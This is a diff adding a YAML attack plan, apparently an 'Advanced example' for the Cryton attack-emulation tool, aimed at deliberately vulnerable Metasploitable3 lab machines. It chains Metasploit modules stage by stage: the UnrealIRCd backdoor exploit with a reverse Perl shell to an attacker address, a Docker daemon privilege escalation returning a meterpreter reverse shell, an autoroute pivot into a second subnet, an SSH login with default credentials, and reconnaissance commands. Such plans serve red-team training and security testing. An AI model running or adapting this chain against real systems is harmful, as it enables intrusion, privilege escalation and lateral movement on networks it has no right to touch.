@@ -1,0 +1,145 @@
+plan:
+  name: Advanced example
+  owner: test name
+  stages:
+  - name: stage-one
+    trigger_type: delta
+    trigger_args:
+      seconds: 1
+    steps:
+    - name: exploit-ircd
+      step_type: cryton/execute-on-worker
+      info:
+        source: "attacker"
+        target: "metasploitable3-ubuntu"
+        action: "Exploit IRCD backdoor"
+      is_init: true
+      arguments:
+        create_named_session: session_to_target_1
+        attack_module: mod_msf
+        attack_module_args:
+          exploit: "exploit/unix/irc/unreal_ircd_3281_backdoor"
+          exploit_arguments:
+            RHOSTS: "172.28.128.99"
+            RPORT: "6697"
+            PAYLOAD: "cmd/unix/reverse_perl"
+            LHOST: "172.28.128.3"
+            LPORT: "4444"
+      next:
+        - type: result
+          value: OK
+          step: stage1-whoami
+    - name: stage1-whoami
+      step_type: cryton/execute-on-worker
+      info:
+        source: "TODO"
+        target: "TODO"
+        action: "TODO"
+      arguments:
+        use_named_session: session_to_target_1
+        attack_module: mod_cmd
+        attack_module_args:
+          cmd: "whoami && id && uname -a"
+
+
+  - name: stage-two
+    trigger_type: delta
+    trigger_args:
+      seconds: 5
+    depends_on:
+    - stage-one
+    steps:
+    - name: exploit-dockerd-privesc
+      info:
+        source: "TODO"
+        target: "TODO"
+        action: "TODO"
+      step_type: cryton/execute-on-worker
+      is_init: true
+      arguments:
+        create_named_session: session_to_target_1_root
+        attack_module: mod_msf
+        use_named_session: session_to_target_1
+        attack_module_args:
+          exploit: "exploit/linux/local/docker_daemon_privilege_escalation"
+          exploit_arguments:
+            PAYLOAD: "linux/x64/meterpreter/reverse_tcp"
+            LHOST: "172.28.128.3"
+            LPORT: "4455"
+
+
+  - name: stage-three
+    trigger_type: delta
+    trigger_args:
+      seconds: 5
+    depends_on:
+    - stage-two
+    steps:
+    - name: set-msf-route
+      info:
+        source: "TODO"
+        target: "TODO"
+        action: "TODO"
+      step_type: cryton/execute-on-worker
+      is_init: true
+      arguments:
+        attack_module: mod_msf
+        use_named_session: session_to_target_1_root
+        attack_module_args:
+          exploit: post/multi/manage/autoroute
+          exploit_arguments:
+            CMD: "add"
+            NETMASK: "255.255.255.0"
+            SUBNET: "192.168.62.0"
+
+
+
+
+
+  - name: stage-four
+    trigger_type: delta
+    trigger_args:
+      seconds: 5
+    depends_on:
+    - stage-three
+    steps:
+    - name: target-metasploitable3-windows
+      info:
+        source: "TODO"
+        target: "TODO"
+        action: "TODO"
+      step_type: cryton/execute-on-worker
+      is_init: true
+      arguments:
+        create_named_session: session_to_target_2
+        attack_module: mod_msf
+        attack_module_args:
+          exploit: auxiliary/scanner/ssh/ssh_login
+          exploit_arguments:
+            RHOSTS: "192.168.62.98"
+            USERNAME: "vagrant"
+            PASSWORD: "vagrant"
+
+
+  - name: stage-five
+    trigger_type: delta
+    trigger_args:
+      seconds: 5
+    depends_on:
+    - stage-four
+    steps:
+    - name: win-whoami
+      info:
+        source: "TODO"
+        target: "TODO"
+        action: "TODO"
+      step_type: cryton/execute-on-worker
+      is_init: true
+      arguments:
+        attack_module: mod_cmd
+        use_named_session: session_to_target_2
+        attack_module_args:
+          cmd: "whoami"
+
+
+
